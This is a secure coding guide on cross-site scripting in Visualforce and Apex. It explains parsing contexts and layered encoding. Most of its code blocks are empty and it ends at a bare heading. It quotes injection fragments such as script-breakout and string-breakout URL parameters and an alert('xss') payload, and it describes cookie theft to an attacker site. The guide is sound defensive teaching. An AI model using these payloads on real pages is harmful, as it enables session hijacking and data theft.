---
title: "Secure Coding Cross Site Scripting"
domain: secure-coding-guide
topic: secure-coding-cross-site-scripting
apiVersion: 67.0
release: summer-26-v67
docType: concept
lastCollected: 2026-03-12T09:35:44.476Z
estimatedTokens: 14196
keywords: [Secure, Coding, Cross, Site, Scripting, Cross-site, XSS, prevalent, security, threat, attackers, inject, malicious, scripts, web]
---

# Secure Coding Cross Site Scripting

> Cross-site scripting (XSS) is a prevalent security threat where attackers inject
        malicious scripts into web pages, potentially leading to data theft, session hijacking, and
        altered website content. This topic will cover how XSS attacks work and how to protect
        against them.

# Secure Coding Cross Site Scripting

Cross-site scripting (XSS) is a prevalent security threat where attackers inject malicious scripts into web pages, potentially leading to data theft, session hijacking, and altered website content. This topic will cover how XSS attacks work and how to protect against them.

## What is it?

Cross-site scripting is a vulnerability that occurs when an attacker can insert unauthorized JavaScript, VBScript, HTML, or other active content into a web page viewed by other users. A malicious script inserted into a page in this manner can hijack the user’s session, submit unauthorized transactions as the user, steal confidential information, or simply deface the page. Cross-site scripting is one of the most serious and most common attacks against web applications today.

XSS allows malicious users to control the content and code on your site — something only you should be able to do!!

## Sample vulnerability

Consider a web application with a search feature. The user sends their query as a GET parameter, and the page displays the parameter in the page:

*Request:* https://example.com/api/search?q=apples

*Response:* “You searched for apples”

For example, this could be done with the following Visualforce page:

```

```

An XSS attack could take place if the user were visiting another site that included the following code:

```

```

The user’s browser will load the iframe by requesting https://example.com/api/search?q=<svg .....>.

In response, example.com will echo back:

```

```

The victim’s browser will parse this response and render the following example.com DOM:

```

```

Once the DOM is rendered, the browser will navigate the page to cybervillians.com and will also send the user's examle.com cookies there. It will be as if example.com developers had written their page that way. However, there is essentially no limit to the payloads the attacker could have provided. Anything example.com developers can do with HTML and JavaScript, the attacker can also do.

## Overview of browser parsing

Cross-site scripting occurs when browsers interpret attacker controller data as code, therefore an understanding of how browsers distinguish between data and code is required in order to develop your application securely.

User data can and often is processed by several different parsers in sequence, with different decoding and tokenization rules applied by each parser. The sample vulnerability highlights three parsing stages:

-   Three Parsing Stages and Three Attacks

    The merge-field {!$CurrentPage.parameters.q} is first passed to the HTML parser as it is processing the contents of a <script\> tag. In this context, the parser is looking for the closing tag: </script\> to determine the extent of the script data that should be passed to the Javascript engine.

    ```

    ```

    If the attacker sets the URL parameter:q=</script\><script\> *..attacker code here..* </script\>

    The HTML parser determines the original script block has ended, and an attacker controlled script block would be sent as a second script to the Javascript engine.

    Next, when the script block is sent to the Javascript parser, the attacker can try to break out of the Javascript string declaration:

    ```

    ```

    For example, by setting the URL parameter to be q='; *....attacker code here..*;//'

    Finally, the Javascript parser invokes an innerHTML write, passing a string back to the HTML parser for DOM rendering. Here the attacker can inject another payload containing an HTML tag with a javascript event handler. Because the string passed to innerHTML is defined in a Javascript context, the control characters do not need to be < or >, but can be represented as '\\x3x' and '\\x3e'. These will be interpreted by the Javascript engine as brackets to be written into the DOM. This is the original sample attack.

    Therefore the sample code has three different parsing stages which allow for three different attacks, triggered by the insertion of three different control characters:

    -   \> can be used to break out of the original script block
    -   ' can be used to break out of the javascript string declaration
    -   \\x3c or \\u003c or < can be used to inject a new tag via innerHTML.

    Other constructions have other parsing stages and potential attacks -- the list of potentially dangerous characters is dependent on the sequence of parsers applied to user data.

    Rather than trying to learn all possible dangerous characters, the developer should learn to identify the sequence of browser parsing passes and apply the corresponding sequence of escaping functions. This will ensure that user data renders properly as text and cannot escape into an execution context.

-   HTML Parsing and Encoding

    When an HTML document is loaded or when javascript calls an html rendering function, the string is processed by the HTML Parser.

    HTML tags follow the general structure:

    ```

    ```

    Only attribute values and the textvalue of a node are considered data for the HTML parser. All other tokens are considered markup.

    There are two main mechanisms of injecting javascript into HTML:

    ```

    ```

    -   Directly as a script tag or other HTML tag that supports a javascript event handler
    -   Breaking out of an html tag and creating another html tag that is a javascript event handler

    Because of this, user input within an html context needs to be prevented from breaking out of a quoted context or from injecting html tags. This is done with HTML encoding.

    HTML Encoding

    In order to force a string character to be interpreted as data rather than markup, a [character reference](http://www.w3.org/TR/html5/syntax.html#character-references) should be used. There are two common ways to denote a character reference:

    -   *numeric character references* represent the character by an ampersand (&), the pound sign (#) followed by either the decimal unicode point value, or an "x" and the hexadecimal unicode value. Finally, a semicolon (;) closes out the character reference. This allows every unicode character to be referenced.
    -   *entity character references* represent a subset of commonly used special characters by an ampersand (&) an ascii mnemonic for the character's name, and an (optional) closing semicolon.

    HTML Encoding is the process of replacing characters by their character references and HTML decoding is the reverse.

    ```

    ```

    The HTML parser generates the following DOM:

    ```

    ```

    which the browser renders as:

    ```

    ```

    -   For link1, because the bracket is replaced by its character reference, the less than sign is treated as a string literal. The closing tag </a> is viewed as a redundant closing tag and is not rendered in the DOM at all.
    -   In link2, an escaped character immediately follows the opening tag, but the HTML Parser is expecting a tagname which is markup, as this is impossible the HTML parser bails on tag processing and interprets the opening tag as text. The closing tag is swallowed as in link1.
    -   In link3, the anchor tag is successfully parsed but as the "h" in "href" is escaped, the href is not interpreted as an attribute and the result is an anchor tag without an href, the link text appears but is not clickable.
    -   In link4, because a portion of an attribute value is encoded, the character references are decoded to "www.sales" in the DOM and the link is clickable, successfully navigating to www.salesforce.com

    Therefore if developers html encode user data prior to HTML rendering, the data will always render as text and never as markup. In general, only a subset of characters are html encoded: those characters that can allow an attacker to inject their own tags or break out of a quoted attribute value:
    | Common Name | Symbol | Decimal Numeric | Hex Numeric | Entity |
    | --- | --- | --- | --- | --- |
    | Ampersand | & | &#38; | &#x26; | &amp; |
    | Less than Symbol | < | &#60; | &#x3c; | &lt; |
    | Greater than Symbol | > | &#62; | &#x3e; | &gt; |
    | Single Quote | ' | &#39; | &#27; | N/A |
    | Double Quote | " | &#34; | &#22; | &quot; |

    When using unquoted attribute values or when failing to close tags other characters need to be escaped. However in this case the set of characters that would need to be escaped are browser dependent and may change with new browser versions. Developers should ensure that all HTML tags are balanced and that all attribute values are quoted. User data within an HTML context should only appear as the text content of an existing tag or within a quoted attribute value.

-   HTML Parsing Contexts

    The HTML parser operates in several contexts: the most important of which are normal, raw text, and escapable raw text contexts.

    PCDATA or Normal Context Parsing

    For most tags the PCDATA (in HTML 4), or normal (in HTML 5) parsing context applies. In this context the HTML parser tries to balance nested tags and performs HTML decoding prior to DOM rendering.

    For example, the HTML parser converts:

    ```

    ```

    into the following DOM:

    ```

    ```

    For PC Data parsing, keep in mind that

    -   Because tags and attribute values are balanced, the parser will not allow a data within an attribute value to inject a new tag or close out an existing tag, as per the example above. The only way to escape a quoted attribute value is to close out the quote OR enter a CDATA context.
    -   All character references are decoded, and are therefore unsafe to be used as inputs into further HTML rendering contexts without applying an additional round of encoding.

    Raw Text or CDATA Parsing

    For <script> and <style> tags the CDATA (HTML 4) or [raw text](http://www.w3.org/TR/html5/syntax.html#raw-text-elements) (HTML 5) context applies. In this mode, the parser searches for the closing script or style tag, and dispatches the contents of the string between these tags to the javascript or CSS parser. No HTML decoding occurs. This is because the HTML parser does not understand javascript or CSS; its parsing role is limited to determining the length of the string to pass to the JS or CSS parser.

    The following code:

    ```

    ```

    Sends two scripts to the javascript engine, resulting in:

    ```

    ```

    Another example:

    ```

    ```

    Clicking on the first div logs decoded, whereas clicking on the second logs &#100;&#101;&#99;&#111;&#100;&#101;&#100; and clicking on the third div pops an alert box.

    CDATA-style processing presents a number of potential pitfalls:

    -   Refactoring issues: If a developer first defines the event handler inline and then re-factors to register event handlers within a script tag, she will need to ensure that one fewer HTML-encode operation occurs, otherwise data will be over encoded. Similarly, a refactoring away from separate registration towards inline definition can lead to under-encoding. In both cases, the resulting page is broken, however alphanumeric characters will continue to render properly even as a "<" will be rendered as "&lt;" or interpreted as markup in the over or under-encoding cases.
    -   JS string escapes: As per the example, if an attacker can inject brackets into a javascript string context, they may be able to break out of the string by breaking out of the parent script context entirely. This effectively makes brackets javascript control characters.
    -   Complex parsing rules with comments: The combination of html-style comment tags with <script> or <style> tags can lead to confusing or unexpected behavior. We will not detail these parsing rules here, but developers should not nest <script> tags within each other or place html comments <!-- on the same line as <script> tags.

    Escapable Raw Text Parsing

    For <textarea> and <title> tags, [escapable raw text](http://www.w3.org/TR/html5/syntax.html#escapable-raw-text-elements) parsing is used. Here the parser looks for the closing <textarea> or <title> tag and does not allow the creation of any new tags. Nevertheless, character references are decoded.

    In this context keep the following in mind:

    -   Do not assume that user data cannot break out of this context -- data can break out by closing the title or textarea tag.
    -   When using this context to store HTML micro templates, do not allow user input to write to this context without HTML encoding
-   Javascript Parser

    A Javascript Parser tokenizes javascript code for execution by the browser's javascript engine. Javascript code can generate new HTML code (e.g. document.write() element.innerHTML=x) and can also skip the HTML Parser and update the DOM directly (e.g.document.createElement(), element.title=x, document.body.appendChild()). Javascript code can also update element styles via the CSS Object Model (CSSOM).

    Javascript has several encoding formats:

    -   C-style backslash \\ encoding of special terminal characters and string literals
    -   2 byte hex encoding of the corresponding ASCII code point: \\xNN
    -   3 digit octal encoding of the corresponding code point \\NNN
    -   4 byte hex encoding of a 4 byte UTF-16 plane: \\uNNNN. Surrogate pairs are handled by placing the 4 byte references next to each other \\uAAAA\\uBBBB

    The following table shows the typical behavior of a javascript encoder:
    | Common Name | Symbol | Common JS Encoding |
    | --- | --- | --- |
    | Single Quote | ' | \' |
    | Double Quote | " | " |
    | Backslash | \ | \\ |
    | Carriage Return | N/A | \r |
    | New Line | N/A |  |
    | Less than Symbol | < | \x3c |
    | Greater than Symbol | > | \x3e |

    Javascript encoding is not nearly as powerful as HTML encoding. Object names (variables, functions, arrays) can be encoded in Javascript and still be callable, so merely encoding something does not mark it as data rather than code. Instead, Javascript encoding is used to prevent user data from breaking out of a quoted string context, by escaping the characters that would close out a string (single and double quotes, as well as new lines). Additionally, because of CDATA parsing, a closing script tag can also break out of a string (by breaking out of the enclosing script).

    Note that if user controlled data is placed into a javascript context without being quoted, then nothing can prevent XSS. All user data in javascript should be quoted AND encoded.

    Be aware that Javascript decoding occurs in Javascript when strings are evalued as code such as with eval, setInterval, or Function, in which case you will need to additionally JS encode user data for each implicit eval performed. Because of this it is recommended that you do not apply evals on code containing user data.

    Javascript can invoke the HTML parser by means of one of built in HTML rendering methods:
    | HTML Rendering Methods |
    | --- |
    | document.write |
    | document.writeln |
    | element.innerHTML |
    | element.outerHTML |
    | element.insertAdjacentHTML |

    If you are using jquery, the following are common DOM manipulation methods that invoke the HTML parser in their implementation. c.f. [Dom XSS Wiki](https://code.google.com/p/domxsswiki/wiki/jQuery)
    | Common jQuery HTML Rendering Methods |
    | --- |
    | .add() |
    | .append() |
    | .before() |
    | .after() |
    | .html() |
    | .prepend() |
    | .replaceWith() |
    | .wrap() |
    | .wrapAll() |

    If you are using a different toolkit or higher order javascript framework, you will need to know whether the methods you call invoke the HTML decoder or not, otherwise you risk over or under-encoding data.

    ```

    ```

-   URI Parser

    The URI parser tokenizes URIs into the following components:

    ```

    ```

    Control characters for the URI parser are the full ascii scheme name, scheme delimiter ":", ".", "?", "/", and "#". Data for the URI parser are the two credentials, the address, path, query string and fragment content.

    In those cases when, for example a path needs to contain a question mark that should not be interpreted as a control character, then URI Encoding is used: %3f. URI encoding is defined in RFC 3986 and consists of a % sign followed by the two byte hexadecimal extended ascii number.

    For security encoding, be aware that browsers support multiple pseudo-schemes, the most important of which is the javascript pseudo scheme: javascript:*..payload..*

    If the scheme or scheme delimeter (:) is URI encoded, it will not be interpreted as a scheme. Similarly, if a "/" is URI encoded, it will not be interpreted as a path delimiter. Therefore URI encoding an a string and setting it to be an href will cause the browser to interpret the entire string as a relative path with no URL parameters and no fragments.

    ```

    ```

    Because URI encoding maps characters to %XX, which are not HTML, JS, or CSS control characters, we can skip any additional encodings that would need to occur after URI encoding, but we cannot skip encodings that are required before URI encoding:

    ```

    ```

    In the above, payload will be sent to a URI parser (in the href definition) and then to the HTML parser. Therefore to properly encode the payload requires both decodings: URIENCODE(HTMLENCODE(*payload*)).

    If, for example, the payload is only HTMLENCODED, then %3c will be URI decoded into a bracket. If the payload is only URIENCODED, then a payload of "<" can be injected directly.

    As URI Encoding is only defined on ASCI codes 0-255, when higher order code points need to be encoded, they are first transformed into a sequence of UTF-8 bytes and then each byte is URI Encoded.

    Be aware that javascript contains three built in URI encoding and decoding functions, none of which are suitable for security encoding:

    -   escape(), unescape() have been deprecated because of improper UTF-8 handling.
    -   encodeURI() and decodeURI() are designed to allow URIs with some illegal characters to be converted to legal URIs. These functions do not encode URI control characters such as "://" or ".".
    -   encodeURIComponent() and decodeURIComponent() are designed to encode all URI control characters but do not encode all characters such as the single quote.

    For guidance as to which functions to use, see the specific section guidance.

-   CSS Parser

    CSS parsers have their own [encoding format](http://www.w3.org/TR/2002/WD-CSS21-20020802/syndata.html#tokenization) as specified in ISO 10646. CSS encoding consists of a backslash followed by up to 6 hexadecimal digits corresponding to the unicode code point. As the number of digits is variable, a trailing space is required to close out the character reference if less than 6 digits are used, and in this case the space is consumed by the CSS parser.

    As with Javascript encoding, merely encoding a string does not force the CSS parser to treat it as data rather than markup -- the encoding is only useful to prevent user data from breaking out of a quoted string declaration. Unfortunately, many CSS property values are not quoted, in which case it is impossible to safely encode the value. In this case, strict use of an allowlist (which provides a list of allowed values and prevents the use of anything unlisted) is required to ensure that only the expected characters are present in the string.

    There are several ways that the CSS parser can invoke the URI parser (for example by referencing an image URL or a style sheet URL), but invocation of javascript from CSS is limited to browser specific features such as moz-bindings or older browser features (such as expression or javascript pseudo-schemes). Nevertheless, as Salesforce supports these older browsers, it's critical to use an allowlist—a list of all acceptable values— on user data whenever it is passed to the CSS interpreter.

    When CSS is invoked from javascript, for example with element.style="x", it is first interpreted by the javascript parser and then by the CSS parser. In such cases, javascript control characters should be escaped. If they aren't, they could be used to bypass the allowlist filter. For this reason, filtering against the allowlist should be done as close to the sink as possible.


## General References

-   -   [Coverity Static Analysis](https://www.synopsys.com/software-integrity/static-analysis-tools-sast/coverity.html)
    -   [OWASP XSS Portal](http://www.owasp.org/index.php/Cross_Site_Scripting)
    -   [HTML5 Security Cheet Sheet](https://html5sec.org/)
    -   [OWASP XSS Test Guide](http://www.owasp.org/index.php/Testing_for_Cross_site_scripting)
    -   [Browser Internals and Parsing](http://www.html5rocks.com/en/tutorials/internals/howbrowserswork/)
    -   [Browser Security Handbook](https://code.google.com/p/browsersec/)
    -   [Browser Parsing and XSS review of different frameworks](http://www.comp.nus.edu.sg/~prateeks/papers/empirical-webfwks.pdf)

## Specific Guidance

Apex and Visualforce Applications

The platform provides two main mechanisms to avoid cross site scripting: auto HTML encoding as well as built in encoding functions that can be invoked manually from VisualForce. Nevertheless in order to use these protections correctly, the developer needs to have a thorough understanding of how user controlled variables are rendered by the browser.

There is no 'easy' button with cross site scripting defenses. Developers must understand the sequence of rendering contexts into which they place user data, and encode appropriately for each context.

Built in Auto Encoding

All merge-fields are always auto HTML encoded provided they

-   do not occur within a <style> or <script> tag
-   do not occur within an apex tag with the escape='false' attribute

The auto HTML encoding performed is applied last (after any other VisualForce functions) and is applied regardless of whether you use any other VisualForce encoding functions. It does not matter whether the merge-field is rendered via an explicit apex tag or directly using the braces notation within HTML markup. Your application code needs to take auto-encoding into account in order to avoid double encoding or improperly encoding merge-fields.

For example, the value of the userInput parameter will be HTML encoded in the following:

```

```

or here

```

```

But no auto-encoding is performed here because of the script tag:

```

```

And no auto-encoding is performed here because of the style tag:

```

```

The auto encoding only provides HTML Encoding of <, > and quotes within html attributes. You must perform your own Javascript and URL encoding as well as handle CSS cross site scripting issues.

Auto-HTML encoding is not sufficient when passing through multiple parsing contexts:

```

```

In the above code fragment, userInput is rendered with a Javascript execution context embedded with an HTML context, and so the auto-HTML encoding is insufficient. For these and other uses cases, the platform provides VisualForce encoding functions that can be chained together to provide sufficient encoding in multiple contexts.

Unsafe sObject Data Types

sObjects can be built from a number of primitive data types. When rendering a merge-field or retrieving a field via the API, it's important to understand whether the field contains potentially unsafe or safe content. The following primitive data types can contain unsafe strings:
| Primitive Type | Restrictions on Values |
| --- | --- |
| url | Can contain arbitrary text. The platform will prepend the url with 'http://' if no scheme is provided. |
| picklist | Can contain arbitrary text, independent of the field definition. Picklist values are not enforced by the schema, and users can modify a picklist value to contain any text via an update call. |
| text | Can contain arbitrary text |
| textarea | Can contain arbitrary text |
| rich text field | Contains an allowlistt of HTML tags. Any other HTML characters must be HTML-encoded. The listed tags can be safely usedunencoded in an HTML rendering context but not in any other rendering context (e.g. javascript control characters are not encoded). |

Name fields can be arbitrary text, and must be considered unsafe. This also applies to global variables such usernames.

Developers are urged to program defensively. Even if a primitive type (such as an Id) cannot contain control characters, properly output encode the field type based on the rendering context. Output encoding will never result in over encoding and will make your application safe for further refactoring should the controller logic change -- for example, by pulling the Id from a URL parameter rather than from the controller.

Built in VisualForce encoding functions

The platform provides the following VisualForce encoding functions:

-   JSENCODE -- performs string encoding within a Javascript String context.
-   HTMLENCODE -- encodes all characters with the appropriate HTML character references so as to avoid interpretation of characters as markup.
-   URLENCODE -- performs URI encoding (% style encoding) within a URL component context.
-   JSINHTMLENCODE -- a convenience method that is equivalent to the composition of HTMLENCODE(JSENCODE(x))

Data may need to be encoded multiple times if it passes through multiple parsers.

JSENCODE

JSENCODE is used to prevent user data from breaking out of a quoted string context:

```

```

If the data was not quoted, the user could insert their own code directly into the script tag. If the user was quoted but not JSENCODED, an attacker could break out of the quotes by including a single quote in the URL parameter:

```

```

at which point the attacker's code would execute.

In the following example, a merge-field first passes through the HTML parser (when the page is loaded) and then is passed to the JS parser (as the definition of an event handler).

```

```

Because the parsing flow is HTML Parser -> JS Parser, the mergefield must be properly encoded as: HTMLENCODE(JSENCODE(x)). As we know that the platform will HTML auto-encode last, it is enough to explicitly invoke the inner encoding, JSENCODE.

What is the merge-field is not typed as a string? One option is to leave the merge-field naked. However this is a dangerous anti-pattern because it creates a dependency between the implementation details in the controller and the security of the visualforce page. Suppose, for example, that in the future, the controller pulls this value from a URL parameter or textfield. Now the visualforce page is vulnerable to cross site scripting. The security of the visualforce page should be decoupled as much as possible from the controller implementation.

Therefore we recommend defensive programming -- cast to the appropriate type explicitly using the built in constructors:

```

```

This way a subtle change in the controller implementation (for example, pulling the value from a URL parameter or text field) will not trigger a security vulnerability in the corresponding VisualForce page.

HTMLENCODE

HTMLENCODE is required when userdata is interpreted in an HTML Context and is not already auto-encoded.

For example:

```

```

In the above, because Name fields can be arbitrary text strings, any rendering of this field needs to be properly output encoded. Because we want to combine markup (italics) with data, the apex tag is set to escape="false" and we manually encode user data.

As always, one layer of encoding needs to be applied for each layer of parsing:

```

```

In the above, the merge-field first passes through the HTML Parser when the page is loaded, but because the merge-field is within a script tag, the HTML parser does not perform character reference substitution and instead passes the contents of the script block to the javascript parser. Javascript code then calls innerHTML which performs HTML parsing (and character reference substitution). Therefore the parsing is Javascript -> HTML, and the necessary encoding is JSENCODE(HTMLENCODE()). Note that only performing JSENCODE or only performing HTMLENCODE will lead to a broken page and possibly a cross site scripting vulnerability.

Consider the following example:

```

```

Here, the merge-field is sent through the HTML parser when the page is loaded. Because it is not in a script or style tag, character reference substitution occurs, and the result is then sent to the Javascript decoder (in the definition of the onclick event handler). Once clicked, the result will be sent back to the HTML parser for innerHTML rendering. Therefore there are three layers of decoding: HTML -> Javascript -> HTML, and as a result, three layers of encoding need to be applied. However HTML auto encoding will be automatically applied at the outer layer, so the developer needs to only apply JSENCODE(HTMLENCODE()):

```

```

As a final example, and to illustrate the potential complexity of encodings:

```

```

Here, the merge-field is first parsed by the HTML parser when the page is loaded, is then passed to the Javascript parser in the definition of the on-click handler, is passed again to the HTML parser when the onclick handler is invoked, and is finally passed to the Javacript parser when the element is clicked a second time. Therefore the merge-field needs to be encoded as follows: HTMLENCODE(JSENCODE(HTMLENCODE(JSENCODE()))). Because auto-encoding takes care of the outer HTMLENCODE, the code fragment can be properly sanitized as follows:

```

```

URLENCODE

URLENCODING maps each character with ascii code 00-255 to the corresponding two byte hex representation as %XX. Therefore URLENCODING will not provide valid absolute URLs and should only be used when encoding URI components:

```

```

(Note that in the above fragment, Pic.Name within the text content of the image tag does not need to be encoded because it will be auto HTML encoded). Because URLENCODING has such a restricted character output, there is no need to do any additional encoding once URLEncoding is applied, as %XX is not a valid control character for any of the other parsing contexts. Therefore the following is safe and does not need any JSENCODING or HTMLENCODING:

```

```

Nevertheless, even though the above code is safe, it is recommended that you minimize use of HTML rendering as much as possible:

```

```

One thing to keep in mind about URLs is that all browsers will accept a javascript pseudo-scheme for location URLs while older browsers will also accept a javascript pseudo-scheme for src attributes or url attributes within CSS. Therefore you must control the scheme as well as the host and only allow user input to set URL parameters or paths. In those cases when users select the host, you must create an allowlistof acceptable hosts and validate against it to avoid arbitrary redirect vulnerabilities.

JSINHTMLENCODE

JSINHTMLENCODE is a legacy VisualForce function that was introduced when the platform did not always auto HTML encode merge-fields. JSINHTMLENCODE is effectively a combination of HTMLENCODE(JSENCODE()), so before the introduction of auto-HTML encoding, developers would need to call this function when including merge-fields in javascript event handlers within HTML. Now that the platform auto-HTML encodes, it is sufficient to call JSENCODE() in this case.

```

```

```

```

However, because the set of control characters for HTML and Javascript is almost disjoint, calling JSINHTMLENCODE can still be used as a replacement for JSENCODE(HTMLENCODE(x)), and can therefore save one function call in visualforce:

```

```

XSS in CSS

Cascading Style Sheets is an increasingly complex language that is only slowly becoming standardized across browsers. All modern browsers do not allow javascript injection within CSS attribute values, however this is not true for older browsers. Unfortunately it is not sufficient to cast CSS attribute values to strings and then encode the values because many CSS properties are not rendered as strings.

```

```

As a result, do not place any merge-fields within a <style> tag unless they are on an allowlist (a list of acceptable fields, unlisted fields are not allowed) in the controller. Alternatively, first pass the variables to a javascript context, validate them in javascript, and then use CSSOM or a js toolkit to update the style programmatically:

```

```

Client-side encoding and API interfaces

Many applications pull data via API callouts executed in javascript, and then render the data in the DOM with javascript or a javascript-based toolkit. In this case, the VisualForce encoding functions cannot be used to properly encode data, nevertheless the data must still be encoded for the appropriate rendering context. Note that no auto-html encoding is done by the platform when the DOM is rendered client-side, so a simple re-factoring from server-side rendering with VisualForce merge-fields to client-side rendering with javascript may create multiple XSS vulnerabilities.

Consider the following streaming API example:

```

```

Here if xyz\_\_c is built from one of the dangerous sObject types such as text, passing it to an html rendering function creates a vulnerability. In this case, the developer has two options:

-   Use a safe DOM manipulation function such as innerText, rather than innerHTML.
-   Properly encode the data in javascript prior to the innerHTML write

The first option is preferred, but may sometimes be impractical (for example when you are using a higher level toolkit that performs innerHTML writes in the method you are using.) In this case you must use a javascript encoding library.

Javascript Security Encoding Libraries

Although Salesforce does not currently export javascript security encoding methods, there are a number of third party security libraries that you can use.

We recommend the Go Instant [secure-filters library](https://github.com/SalesforceEng/secure-filters) because it has been vetted by the Salesforce security team and is small and easy to use. It is also available as a node package. To use this library, place the secure-filters.js file in your static resources. The library will export a secureFilters object which has a number of encoding methods:

```

```

Notice that when generating the logs, in one case the sample code applied html(js(result)) encoding needs to be applied while in another, no encoding needs to be applied even though the code is trying to do the same thing: create an event handler that logs a user controlled string to the console.

This is because in the first case, user data is serialized into a string which is passed to the HTML parser, which, when parsed includes an attribute value definition -- serialized into another string -- that is passed to the JS parser. Therefore two layers of encoding are needed.

In the second case, the event handler was defined directly in javascript as a function and assigned to a DOM property. Because no string serialization or de-serialization occured, no client-side encoding was required.

Avoiding Serialization

As each round of serialization and de-serialization creates a need for encoding, avoid serialization whenever possible by using innerText rather than innerHTML, setAttribute rather than string concatenation, and by defining event handlers directly in javascript rather than inline within the html tag.

```

```

Built-in API encodings

Javascript remoting can be invoked with {escape: false} or (the default) {escape: true}. Enabling escaping means that the response is html encoded. In general developers should use {escape: true} when possible, but there are many cases where global html encoding at the transport layer is inappropriate.

-   Encoding at the transport layer means that every field is html encoded, even if some fields (e.g. rich text fields) should not be encoded.
-   In some cases, built in encoding is not available at the transport layer.

However, the advantage of html encoding at the transport layer is that if your page design is very simple (so that you only need html encoding), then you will not need to import a client side encoding library.

The following table lists the transport-layer encoding policies of different APIs:
| API | Transport Layer Encoding Policy |
| --- | --- |
| SOAP API/REST API | never encodes |
| Streaming API | never encodes |
| Ajax Toolkit | never encodes |
| Javascript Remoting | HTML encoding unless explicit {escape:’false’} |
| Visualforce Object Remoting | always HTML encodes |

If you are using a higher level API (such as the REST Toolkit or Mobile Toolkit), please examine the documentation to determine what the encoding policies are, or examine the code to determine which low level APIs are being invoked. For example, the ForceTk client uses the REST API, and therefore all data is passed back raw:

```

```

Other taint sources

In addition to API calls, taint can be introduced into the page through a number of browser supplied environment variables such as location, cookie, referer, window.Name, and local storage -- as well as through data pulled from any other remote source (e.g. window.postMessage, xhr calls, and jsonp). Finally, taint sources can propage through other DOM properties:

```

```

The [Dom XSS Wiki](https://code.google.com/p/domxsswiki/wiki/Introduction) contains a detailed list of sinks, sources and sample code.

Javascript Micro Templates

Developers wanting to move more presentational logic to the client often make use of javascript templating languages to handle html generation.

There are a large number of javascript micro-templating frameworks, roughly falling into two categories:

-   logic-less frameworks such as mustache.js have their own domain specific language for iteration and and logical operations.
-   embedded javascript frameworks such as underscore\_js’s \_template function use javascript to perform iteration and logical operations with client-side merge-fields, obviating the need to learn a DSL.

Nevertheless, none of the encoding or security concerns go away with these frameworks -- developers still need to be mindful of the type of data that is passed into the framework and the ultimate context in which the data will be rendered in order to properly output encode all variables, but additionally they need to study the built in encoding options offered by the framework. Generally all frameworks have support for some kind of html encoding, but the developer should verify that this includes escaping of single and double quotes for rendering within html attributes.

For rendering URLs, Javascript, or CSS, the developer is on their own and must either not render user-data in these contexts or use a third party security library to properly escape output in all contexts other than pure html.

One concern to keep in mind is that sometimes template data is stored in textarea tags with visibility set to hidden. In this case, be aware that HTML rendering occurs when data is sent to a textarea field.

Finally, never place merge-fields into template data, as templates are invoked with eval(). Rather, define use merge-fields to define variables outside of your template and then pass the variable reference to the template.

Underscore Templates

All templates use innerHTML style rendering and so developers must ensure that template variables are encoded. Underscore templates allow for auto-HTML encoding with the <%- %>. No HTML encoding is done with <%= %>, which should in general be avoided. However, HTML encoding is generally insufficient so these templates cannot be securely used for templating unless you include additional client side encoding functions. The following example shows how to secure an underscore\_js tempalate using the secure-filters library.

```

```

ESAPI and Encoding within Apex

Encoding within the controller is strongly discouraged as you should encode as close to the rendering context as possible. Whenever encoding occurs within a controller, a dependency is created between the View and the Controller, whereas the controller should be agnostic to how the data is rendered. Moreover, this pattern is not robust because the visualforce page may want to render the same variable in several different contexts, but the controller can only encode in one.

Do not attempt to generate HTML code or javascript code in the controller.

Nevertheless if you must encode within the controller, please use the latest version of the [ESAPI](https://github.com/forcedotcom/force-dot-com-esapi/), which exports global static methods that can be used in your package to perform security encoding.

```

```

Do not use the built in Apex String Encoding functions: String.escapeEcmaScript(), String.escapeHtml3(), and String.escapeHtml4(). These functions are based on Apache's StringEscapeUtils package which was not designed for security encoding and should not be used.

Dangerous Programming Constructs

The following mechanisms do not have built-in auto-HTML encoding protection and should in general be avoided whenever possible.

S-Controls and Custom JavaScript Sources

The <apex:includeScript\> Visualforce component allows you to include a custom script on the page. In these cases be very careful to validate that the content is sanitized and does not include user-supplied data. For example, the following snippet is extremely vulnerable as it is including user-supplied input as the value of the script text. The value provided by the tag is a URL to the JavaScript to include. If an attacker can supply arbitrary data to this parameter (as in the example below), they can potentially direct the victim to include any JavaScript file from any other web site.

```

```

S-Control Template and Formula Tags

S-Controls give the developer direct access to the HTML page itself and includes an array of tags that can be used to insert data into the pages. S-Controls do not use any built-in XSS protections. When using the template and formula tags, all output is unfiltered and must be validated by the developer.

The general syntax of these tags is: {!FUNCTION()} or {!$OBJECT.ATTRIBUTE}.

For example, if a developer wanted to include a user’s session ID and in a link, they could create the link using the following syntax:

```

```

Which would render output similar to:

```

```

Formula expressions can be function calls or include information about platform objects, a user’s environment, system environment, and the request environment. An important feature of these expressions is that data is not escaped during rendering. Since expressions are rendered on the server, it is not possible to escape rendered data on the client using JavaScript or other client-side technology. This can lead to potentially dangerous situations if the formula expression references non-system data (i.e. potentially hostile or editable) and the expression itself is not wrapped in a function to escape the output during rendering. A common vulnerability is created by the use of the {!$Request.\*} expression to access request parameters:

```

```

This will cause the server to pull the title parameter from the request and embed it into the page. So, the request

```

```

would produce the rendered output

```

```

Unfortunately, the unescaped {!$Request.title} tag also results in a cross-site scripting vulnerability. For example, the request

```

```

results in the output

```

```

The standard mechanism to do server-side escaping is through the use of the JSENCODE, HTMLENCODE, JSINHTMLENCODE, and URLENCODE functions or the traditional SUBSTITUTE formula tag. Given the placement of the {!$Request.\*} expression in the example, the above attack could be prevented by using the following nested HTMLENCODE calls:

```

```

Depending on the placement of the tag and usage of the data, both the characters needing escaping as well as their escaped counterparts may vary. For instance, this statement:

```

```

would require that the double quote character be escaped with its URL encoded equivalent of %22 instead of the HTML escaped ", since it’s likely going to be used in a link. Otherwise, the request

```

```

would result in <script\>var ret = "xyz";alert('xss');//”;</script>

Additionally, the ret variable may need additional client-side escaping later in the page if it is used in a way which may cause included HTML control characters to be interpreted. Examples of correct usage are below:

```

```

```

```

```

```

Formula tags can also be used to include platform object data. Although the data is taken directly from the user’s org, it must still be escaped before use to prevent users from executing code in the context of other users (potentially those with higher privilege levels.) While these types of attacks would need to be performed by users within the same organization, they would undermine the organization’s user roles and reduce the integrity of auditing records. Additionally, many organizations contain data which has been imported from external sources, which may not have been screened for malicious content.

General Guidance for Other Platforms

This section briefly summarizes XSS best practices on other platforms.

Allowing HTML injection

If your application allows users to include HTML tags by design, you must exercise great caution in what tags are allowed. The following tags may allow injection of script code directly or via attribute values and should not be allowed. See [HTML 5 Security Cheat Sheet](https://html5sec.org/) for details.

Unsafe HTML Tags:

